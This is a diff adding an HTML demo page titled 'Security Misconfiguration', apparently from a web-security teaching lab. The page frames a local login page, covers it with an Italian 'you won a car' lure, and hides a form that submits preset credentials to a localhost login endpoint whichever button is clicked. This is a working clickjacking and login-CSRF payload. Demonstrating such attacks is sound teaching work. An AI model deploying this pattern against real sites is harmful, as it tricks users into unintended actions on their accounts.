@@ -1,0 +1,48 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Security Misconfiguration</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
+  <style>
+    body {
+      margin: 0;
+    }
+
+    iframe {
+      display: block;
+      background: #000;
+      border: none;
+      height: 100vh;
+      width: 100vw;
+    }
+  </style>
+</head>
+
+<body>
+  <iframe src="http://localhost:3000/login" frameborder="0"></iframe>
+  <div style="background-color: rgba(0,0,0,0.5); position: absolute; top:0; bottom: 0; right: 0; left: 0;
+  width: 100vw;"></div>
+  <div class="position-absolute top-50 start-50 translate-middle card">
+    <div class="card-body p-5">
+      <span class="h1">Hai vinto un'auto</span>
+      <form method="POST" action="http://127.0.0.0:3000/login">
+        <input type="hidden" name="username" value="fake">
+        <input type="hidden" name="password" value="fake">
+        <div class="row justify-content-center mt-5">
+          <input type="submit" class="btn btn-success mb-3" value="Vai">
+          <button type="submit" class="btn btn-danger">No</button>
+        </div>
+      </form>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"
+    integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm"
+    crossorigin="anonymous"></script>
+
+</body>
+
+</html>
